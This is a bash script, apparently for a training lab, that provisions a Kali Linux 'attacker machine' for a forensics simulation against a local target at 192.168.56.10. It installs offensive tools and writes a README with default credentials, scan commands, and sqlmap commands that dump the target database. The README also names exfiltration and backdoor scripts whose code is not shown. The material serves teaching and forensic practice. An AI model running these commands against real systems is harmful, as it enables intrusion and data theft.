#!/bin/bash
#
# Setup Script untuk Attacker Machine (Kali Linux)
# Tools untuk melakukan simulasi serangan dan forensik
#

set -e

echo "=========================================="
echo "  SETUP ATTACKER MACHINE - KALI LINUX    "
echo "=========================================="

# Update system
apt-get update

# Install additional tools
apt-get install -y \
    python3 \
    python3-pip \
    sqlmap \
    nmap \
    nikto \
    dirb \
    gobuster \
    hydra \
    john \
    hashcat \
    wireshark \
    tcpdump \
    netcat-openbsd \
    curl \
    wget \
    git \
    vim \
    tmux

# Install Python libraries untuk attack scripts
pip3 install \
    requests \
    beautifulsoup4 \
    paramiko \
    scapy \
    pwntools \
    colorama

# ============================================
# SETUP ATTACK SCRIPTS DIRECTORY
# ============================================
mkdir -p /home/vagrant/attack_scripts
mkdir -p /home/vagrant/loot
mkdir -p /home/vagrant/logs

# Create attack configuration
cat > /home/vagrant/attack_config.yml << 'EOF'
# Attack Configuration
target:
  ip: "192.168.56.10"
  web_port: 80
  ssh_port: 22
  mysql_port: 3306
  
credentials:
  default_admin: "admin"
  default_pass: "admin123"
  
paths:
  loot_dir: "/home/vagrant/loot"
  logs_dir: "/home/vagrant/logs"
EOF

# Create README untuk attacker
cat > /home/vagrant/README_ATTACKER.md << 'EOF'
# 🎯 Attacker Machine - Simulasi Forensik

## Target Information
- **IP Address**: 192.168.56.10
- **Web Server**: http://192.168.56.10/
- **Admin Login**: admin / admin123

## Available Attack Scripts

1. **reconnaissance.py** - Information gathering
2. **sql_injection.py** - SQL Injection attack
3. **data_exfiltration.py** - Extract data from database
4. **backdoor_install.py** - Install backdoor

## Quick Commands

### Reconnaissance
```bash
# Port scanning
nmap -sV -sC 192.168.56.10

# Web vulnerability scan
nikto -h http://192.168.56.10/

# Directory bruteforce
dirb http://192.168.56.10/
```

### SQL Injection with SQLMap
```bash
# Test login form
sqlmap -u "http://192.168.56.10/login.php" --data="username=admin&password=test" --dbs

# Dump database
sqlmap -u "http://192.168.56.10/login.php" --data="username=admin&password=test" -D techmart_db --dump
```

### Run Attack Scripts
```bash
cd /home/vagrant/attack_scripts
python3 reconnaissance.py
python3 sql_injection.py
python3 data_exfiltration.py
```

## ⚠️ DISCLAIMER
This is for EDUCATIONAL PURPOSES ONLY!
EOF

chown -R vagrant:vagrant /home/vagrant/

echo ""
echo "=========================================="
echo "  ATTACKER MACHINE SETUP COMPLETE!       "
echo "=========================================="
echo ""
echo "Target: 192.168.56.10"
echo "See /home/vagrant/README_ATTACKER.md for instructions"
echo ""
